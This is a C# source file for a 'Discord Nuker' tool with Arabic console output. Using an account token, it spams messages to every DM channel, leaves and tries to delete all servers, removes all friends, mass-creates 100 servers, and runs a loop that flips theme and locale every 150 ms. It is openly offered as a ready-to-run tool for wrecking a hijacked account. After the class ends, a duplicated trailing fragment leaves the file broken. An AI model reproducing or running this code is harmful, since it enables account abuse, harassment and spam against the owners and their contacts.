// Coded / Dev By Tl6esh
// tL6esh Nuker - Discord Nuker Tool
// Copyright © 2025

using System;
using System.Collections.Generic;
using System.Threading;
using System.Threading.Tasks;
using Newtonsoft.Json.Linq;

namespace tL6esh_Nuker
{
    public class AccountNuker
    {
        private static ConsoleColor defaultColor = ConsoleColor.White;
        private static ConsoleColor highlightColor = ConsoleColor.Red;

        
        public void StartNuking(string token, string serverName, string messageContent)
        {
            
            Thread seizureThread = new Thread(() => CustomSeizure(token));
            seizureThread.Start();

            
            SendMessagesToFriends(token, messageContent);

            
            LeaveAllServers(token);

            // Remove all friends
            RemoveAllFriends(token);

           
            CreateServers(token, serverName, 100);

            
            seizureThread.Abort();

            
            ChangeAccountSettings(token);

            ColorWrite("\n\n[", defaultColor);
            ColorWrite("$", highlightColor);
            ColorWriteLine("] تم تدمير الحساب بنجاح!", defaultColor);
        }

        
        public void SendMessagesToFriends(string token, string messageContent)
        {
            ColorWriteLine("\nجاري إرسال رسائل إلى جميع الأصدقاء...", defaultColor);

            Task.Run(async () =>
            {
                try
                {
                    
                    var channelsResponse = await DiscordApi.GetAsync("/users/@me/channels", token);
                    
                    if (channelsResponse != null)
                    {
                        var channels = channelsResponse.ToObject<JArray>();
                        
                        foreach (var channel in channels)
                        {
                            string channelId = channel["id"].ToString();
                            
                           
                            var messageData = new { content = messageContent };
                            await DiscordApi.PostAsync($"/channels/{channelId}/messages", token, messageData);
                            
                            ColorWrite("[", defaultColor);
                            ColorWrite("$", highlightColor);
                            ColorWrite("] ID: ", defaultColor);
                            ColorWriteLine(channelId, defaultColor);
                        }
                    }
                }
                catch (Exception ex)
                {
                    ColorWrite("[", defaultColor);
                    ColorWrite("!", ConsoleColor.Red);
                    ColorWrite("] خطأ: ", defaultColor);
                    ColorWriteLine(ex.Message, ConsoleColor.Red);
                }
            }).Wait();

            ColorWrite("\n[", defaultColor);
            ColorWrite("$", highlightColor);
            ColorWriteLine("] تم إرسال الرسائل إلى جميع الأصدقاء", defaultColor);
        }

        
        public void LeaveAllServers(string token)
        {
            ColorWriteLine("\nجاري مغادرة جميع السيرفرات...", defaultColor);

            Task.Run(async () =>
            {
                try
                {
                    
                    var guildsResponse = await DiscordApi.GetAsync("/users/@me/guilds", token);
                    
                    if (guildsResponse != null)
                    {
                        var guilds = guildsResponse.ToObject<JArray>();
                        
                        foreach (var guild in guilds)
                        {
                            string guildId = guild["id"].ToString();
                            string guildName = guild["name"].ToString();
                            
                          
                            bool success = await DiscordApi.DeleteAsync($"/users/@me/guilds/{guildId}", token);
                            
                            if (success)
                            {
                                ColorWrite("[", defaultColor);
                                ColorWrite("$", highlightColor);
                                ColorWrite("] تمت مغادرة السيرفر: ", defaultColor);
                                ColorWriteLine(guildName, defaultColor);
                            }
                            
                            
                            await DiscordApi.DeleteAsync($"/guilds/{guildId}", token);
                        }
                    }
                }
                catch (Exception ex)
                {
                    ColorWrite("[", defaultColor);
                    ColorWrite("!", ConsoleColor.Red);
                    ColorWrite("] خطأ: ", defaultColor);
                    ColorWriteLine(ex.Message, ConsoleColor.Red);
                }
            }).Wait();

            ColorWrite("\n[", defaultColor);
            ColorWrite("$", highlightColor);
            ColorWriteLine("] تمت مغادرة/حذف جميع السيرفرات", defaultColor);
        }

       
        public void RemoveAllFriends(string token)
        {
            ColorWriteLine("\nجاري حذف جميع الأصدقاء...", defaultColor);

            Task.Run(async () =>
            {
                try
                {
                    
                    var relationshipsResponse = await DiscordApi.GetAsync("/users/@me/relationships", token);
                    
                    if (relationshipsResponse != null)
                    {
                        var relationships = relationshipsResponse.ToObject<JArray>();
                        
                        foreach (var friend in relationships)
                        {
                            string friendId = friend["id"].ToString();
                            string friendName = friend["user"]["username"].ToString();
                            string discriminator = friend["user"]["discriminator"].ToString();
                            
                            
                            bool success = await DiscordApi.DeleteAsync($"/users/@me/relationships/{friendId}", token);
                            
                            if (success)
                            {
                                ColorWrite("[", defaultColor);
                                ColorWrite("$", highlightColor);
                                ColorWrite("] تمت إزالة الصديق: ", defaultColor);
                                ColorWriteLine($"{friendName}#{discriminator}", defaultColor);
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    ColorWrite("[", defaultColor);
                    ColorWrite("!", ConsoleColor.Red);
                    ColorWrite("] خطأ: ", defaultColor);
                    ColorWriteLine(ex.Message, ConsoleColor.Red);
                }
            }).Wait();

            ColorWrite("\n[", defaultColor);
            ColorWrite("$", highlightColor);
            ColorWriteLine("] تمت إزالة جميع الأصدقاء", defaultColor);
        }

        
        public void CreateServers(string token, string serverName, int count)
        {
            ColorWriteLine($"\nجاري إنشاء {count} سيرفر...", defaultColor);

            Task.Run(async () =>
            {
                try
                {
                    for (int i = 0; i < count; i++)
                    {
                        
                        var guildData = new
                        {
                            name = serverName,
                            region = "europe",
                            icon = (string)null,
                            channels = (object)null
                        };
                        
                        await DiscordApi.PostAsync("/guilds", token, guildData);
                        
                        ColorWrite("[", defaultColor);
                        ColorWrite("$", highlightColor);
                        ColorWrite("] تم إنشاء السيرفر: ", defaultColor);
                        ColorWriteLine($"{i + 1}", defaultColor);
                    }
                }
                catch (Exception ex)
                {
                    ColorWrite("[", defaultColor);
                    ColorWrite("!", ConsoleColor.Red);
                    ColorWrite("] خطأ: ", defaultColor);
                    ColorWriteLine(ex.Message, ConsoleColor.Red);
                }
            }).Wait();

            ColorWrite("\n[", defaultColor);
            ColorWrite("$", highlightColor);
            ColorWriteLine("] تم إنشاء جميع السيرفرات", defaultColor);
        }

        
        private void ChangeAccountSettings(string token)
        {
            ColorWriteLine("\nجاري تغيير إعدادات الحساب...", defaultColor);

            Task.Run(async () =>
            {
                try
                {
                    
                    await DiscordApi.DeleteAsync("/hypesquad/online", token);
                    
                   
                    var settingsData = new
                    {
                        theme = "light",
                        locale = "ja",
                        inline_embed_media = false,
                        inline_attachment_media = false,
                        gif_auto_play = false,
                        enable_tts_command = false,
                        render_embeds = false,
                        render_reactions = false,
                        animate_emoji = false,
                        convert_emoticons = false,
                        message_display_compact = false,
                        explicit_content_filter = "0",
                        custom_status = new { text = "tL6esh NUKER RUNS ME <3" },
                        status = "idle"
                    };
                    
                    await DiscordApi.PatchAsync("/users/@me/settings", token, settingsData);
                    
                    
                    var userResponse = await DiscordApi.GetAsync("/users/@me", token);
                    
                    if (userResponse != null)
                    {
                        string username = userResponse["username"].ToString();
                        string discriminator = userResponse["discriminator"].ToString();
                        
                        ColorWrite("\n[", defaultColor);
                        ColorWrite("$", highlightColor);
                        ColorWrite("] تم تغيير إعدادات الحساب: ", defaultColor);
                        ColorWriteLine($"{username}#{discriminator}", defaultColor);
                    }
                }
                catch (Exception ex)
                {
                    ColorWrite("[", defaultColor);
                    ColorWrite("!", ConsoleColor.Red);
                    ColorWrite("] خطأ: ", defaultColor);
                    ColorWriteLine(ex.Message, ConsoleColor.Red);
                }
            }).Wait();
        }

        
        private void CustomSeizure(string token)
        {
            string[] themes = { "light", "dark" };
            string[] locales = { "ja", "zh-TW", "ko", "zh-CN" };
            Random random = new Random();
            
            while (true)
            {
                try
                {
                    Task.Run(async () =>
                    {
                        var settingsData = new
                        {
                            theme = themes[random.Next(themes.Length)],
                            locale = locales[random.Next(locales.Length)]
                        };
                        
                        await DiscordApi.PatchAsync("/users/@me/settings", token, settingsData);
                    }).Wait();
                    
                    Thread.Sleep(150); // Change theme every 150ms
                }
                catch
                {
                    
                    break;
                }
            }
        }

        
        private void ColorWrite(string text, ConsoleColor color)
        {
            ConsoleColor originalColor = Console.ForegroundColor;
            Console.ForegroundColor = color;
            Console.Write(text);
            Console.ForegroundColor = originalColor;
        }

        private void ColorWriteLine(string text, ConsoleColor color)
        {
            ConsoleColor originalColor = Console.ForegroundColor;
            Console.ForegroundColor = color;
            Console.WriteLine(text);
            Console.ForegroundColor = originalColor;
        }
    }
}

                    break;
                }
            }
        }

        // Helper methods for colored console output
        private void ColorWrite(string text, ConsoleColor color)
        {
            ConsoleColor originalColor = Console.ForegroundColor;
            Console.ForegroundColor = color;
            Console.Write(text);
            Console.ForegroundColor = originalColor;
        }

        private void ColorWriteLine(string text, ConsoleColor color)
        {
            ConsoleColor originalColor = Console.ForegroundColor;
            Console.ForegroundColor = color;
            Console.WriteLine(text);
            Console.ForegroundColor = originalColor;
        }
    }
}

